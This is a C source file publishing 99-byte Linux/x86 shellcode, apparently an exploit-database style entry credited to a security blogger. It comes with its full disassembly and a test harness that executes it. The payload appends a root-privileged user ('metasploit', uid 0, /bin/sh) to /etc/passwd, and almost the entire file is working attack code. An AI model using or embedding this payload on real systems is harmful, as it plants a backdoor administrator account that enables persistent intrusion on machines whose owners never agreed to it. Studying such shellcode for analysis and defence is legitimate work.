/* 
*  Title:    Add User Shellcode (MSF Optimization) - 99 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  Description: This shellcode adds the user 'metasploit' with the password 'password' to /etc/passwd. This can be modified in the 'userinfo' section of the shellcode.
*
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/metasploit-adduser-analysis
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	31 db                	xor    ebx,ebx
 8048062:	31 c9                	xor    ecx,ecx

08048064 <setreuid>:
 8048064:	6a 46                	push   0x46
 8048066:	58                   	pop    eax
 8048067:	cd 80                	int    0x80

08048069 <read>:
 8048069:	6a 05                	push   0x5
 804806b:	58                   	pop    eax
 804806c:	31 c9                	xor    ecx,ecx
 804806e:	51                   	push   ecx
 804806f:	68 73 73 77 64       	push   0x64777373
 8048074:	68 2f 2f 70 61       	push   0x61702f2f
 8048079:	68 2f 65 74 63       	push   0x6374652f
 804807e:	89 e3                	mov    ebx,esp
 8048080:	41                   	inc    ecx
 8048081:	b5 04                	mov    ch,0x4
 8048083:	cd 80                	int    0x80
 8048085:	93                   	xchg   ebx,eax

08048086 <pre_write>:
 8048086:	eb 0e                	jmp    8048096 <call_write>

08048088 <write>:
 8048088:	59                   	pop    ecx
 8048089:	6a 04                	push   0x4
 804808b:	58                   	pop    eax
 804808c:	6a 28                	push   0x28
 804808e:	5a                   	pop    edx
 804808f:	cd 80                	int    0x80

08048091 <exit>:
 8048091:	6a 01                	push   0x1
 8048093:	58                   	pop    eax
 8048094:	cd 80                	int    0x80

08048096 <call_write>:
 8048096:	e8 ed ff ff ff       	call   8048088 <write>

0804809b <userinfo>:
 804809b:	6d                   	ins    DWORD PTR es:[edi],dx
 804809c:	65                   	gs
 804809d:	74 61                	je     8048100 <userinfo+0x65>
 804809f:	73 70                	jae    8048111 <userinfo+0x76>
 80480a1:	6c                   	ins    BYTE PTR es:[edi],dx
 80480a2:	6f                   	outs   dx,DWORD PTR ds:[esi]
 80480a3:	69 74 3a 41 7a 50 4a 	imul   esi,DWORD PTR [edx+edi*1+0x41],0x6b4a507a
 80480aa:	6b 
 80480ab:	50                   	push   eax
 80480ac:	69 38 7a 70 70 42    	imul   edi,DWORD PTR [eax],0x4270707a
 80480b2:	6b 3a 30             	imul   edi,DWORD PTR [edx],0x30
 80480b5:	3a 30                	cmp    dh,BYTE PTR [eax]
 80480b7:	3a 3a                	cmp    bh,BYTE PTR [edx]
 80480b9:	2f                   	das    
 80480ba:	3a 2f                	cmp    ch,BYTE PTR [edi]
 80480bc:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
 80480bf:	2f                   	das    
 80480c0:	73 68                	jae    804812a <userinfo+0x8f>
 80480c2:	0a                   	.byte 0xa
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\x31\xc9\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xeb\x0e\x59\x6a\x04\x58\x6a\x28\x5a\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xed\xff\xff\xff\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x50\x4a\x6b\x50\x69\x38\x7a\x70\x70\x42\x6b\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a";

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}